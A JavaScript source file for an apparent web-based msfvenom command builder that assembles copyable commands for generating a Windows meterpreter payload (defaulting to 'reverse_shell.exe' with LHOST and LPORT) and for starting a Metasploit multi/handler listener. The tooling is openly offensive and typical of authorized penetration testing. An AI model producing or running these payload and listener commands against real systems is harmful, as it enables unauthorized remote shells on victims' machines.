// main.js
document.addEventListener('DOMContentLoaded', async function() {
    // Load saved values from localStorage or use defaults
    const savedValues = localStorage.getItem('msfVenomBuilder');
    let values = savedValues ? JSON.parse(savedValues) : {
        Payload: 'windows/meterpreter/bind_tcp',
        LHOST: '10.10.13.37',
        LPORT: '4444',
        Encoder: 'generic/none',
        EncoderIterations: '4',
        Platform: 'windows',
        Arch: 'x64',
        NOP: '200',
        BadCharacters: "\\x00\\x0a\\x0d",
        Format: 'exe',
        Outfile: 'reverse_shell.exe'
    };

    // Load JSON data files
    try {
        const [payloads, encoder, platform, format] = await Promise.all([
            fetch('/static/Red/msfbuilder/data/Payloads.json').then(response => response.json()),
            fetch('/static/Red/msfbuilder/data/Encoder.json').then(response => response.json()),
            fetch('/static/Red/msfbuilder/data/Platform.json').then(response => response.json()),
            fetch('/static/Red/msfbuilder/data/Format.json').then(response => response.json())
        ]);

        // Initialize the form with the loaded data
        initializeForm(payloads, encoder, platform, format);
    } catch (error) {
        console.error('Error loading data files:', error);
        document.getElementById('error-message').textContent = 'Failed to load data. Please check if JSON files are available.';
        document.getElementById('error-message').style.display = 'block';
    }

    function initializeForm(payloads, encoder, platform, format) {
        // Populate select dropdowns
        populateSelect('payload', payloads);
        populateSelect('encoder', encoder);
        populateSelect('platform', platform);
        populateSelect('format', format);
        
        // Set initial form values
        for (const key in values) {
            const element = document.getElementById(key.toLowerCase());
            if (element) {
                if (element.tagName === 'SELECT') {
                    element.value = values[key];
                } else {
                    element.value = values[key];
                }
            }
        }

        // Setup event listeners for all inputs
        document.querySelectorAll('input, select').forEach(input => {
            input.addEventListener('change', updateValues);
        });

        // Update commands on page load
        updateCommands();
    }

    // Helper function to populate select dropdowns
    function populateSelect(id, options) {
        const select = document.getElementById(id);
        if (!select) return;
        
        // Clear existing options
        select.innerHTML = '';
        
        options.forEach((option) => {
            const optElement = document.createElement('option');
            optElement.value = option.value;
            optElement.textContent = option.value;
            select.appendChild(optElement);
        });
    }

    // Function to update values from form
    function updateValues(e) {
        const element = e.target;
        const id = element.id;
        
        // Map HTML form IDs to values object keys
        const keyMap = {
            'lhost': 'LHOST',
            'lport': 'LPORT',
            'encoderiterations': 'EncoderIterations',
            'badcharacters': 'BadCharacters',
            'nop': 'NOP',
            'payload': 'Payload',
            'encoder': 'Encoder',
            'platform': 'Platform',
            'arch': 'Arch',
            'format': 'Format',
            'outfile': 'Outfile'
        };
        
        const key = keyMap[id] || (id.charAt(0).toUpperCase() + id.slice(1));
        values[key] = element.value;
        
        // Save to localStorage
        localStorage.setItem('msfVenomBuilder', JSON.stringify(values));
        
        // Update commands
        updateCommands();
    }

    // Function to generate and update commands
    function updateCommands() {
        // MSFVenom command
        const options = [
            values.LHOST && `LHOST=${values.LHOST}`,
            values.LPORT && `LPORT=${values.LPORT}`,
            values.Platform && `--platform ${values.Platform}`,
            values.Arch && `-a ${values.Arch}`,
            values.NOP && `-n ${values.NOP}`,
            values.Encoder && `-e ${values.Encoder}`,
            values.EncoderIterations && `-i ${values.EncoderIterations}`,
            values.BadCharacters && `-b "${values.BadCharacters}"`,
            values.Format && `-f ${values.Format}`,
            values.Outfile && `-o ${values.Outfile}`
        ].filter(Boolean);

        const msfVenomCommand = `msfvenom -p ${values.Payload} ${options.join(' ')}`;
        document.getElementById('msfvenom-command').textContent = msfVenomCommand;

        // Launch console command
        const launchCommand = `msfconsole -qx "use exploit/multi/handler; set PAYLOAD ${values.Payload}; set LHOST ${values.LHOST}; set LPORT ${values.LPORT}; run"`;
        document.getElementById('launch-command').textContent = launchCommand;

        // Handler only command
        const handlerCommand = `use exploit/multi/handler
set PAYLOAD ${values.Payload}
set LHOST ${values.LHOST}
set LPORT ${values.LPORT}
run`;
        document.getElementById('handler-command').textContent = handlerCommand;
    }

    // Setup copy buttons
    document.querySelectorAll('.copy-btn').forEach(button => {
        button.addEventListener('click', function() {
            const textElement = this.previousElementSibling;
            const textToCopy = textElement.textContent;
            
            navigator.clipboard.writeText(textToCopy)
                .then(() => {
                    this.textContent = 'Copied!';
                    setTimeout(() => {
                        this.textContent = 'Copy';
                    }, 2000);
                })
                .catch(err => {
                    console.error('Failed to copy: ', err);
                });
        });
    });

    // Toggle collapsible sections
    document.querySelectorAll('.collapse-header').forEach(header => {
        header.addEventListener('click', function() {
            this.classList.toggle('active');
            const content = this.nextElementSibling;
            if (content.style.maxHeight) {
                content.style.maxHeight = null;
            } else {
                content.style.maxHeight = content.scrollHeight + "px";
            }
        });
    });
});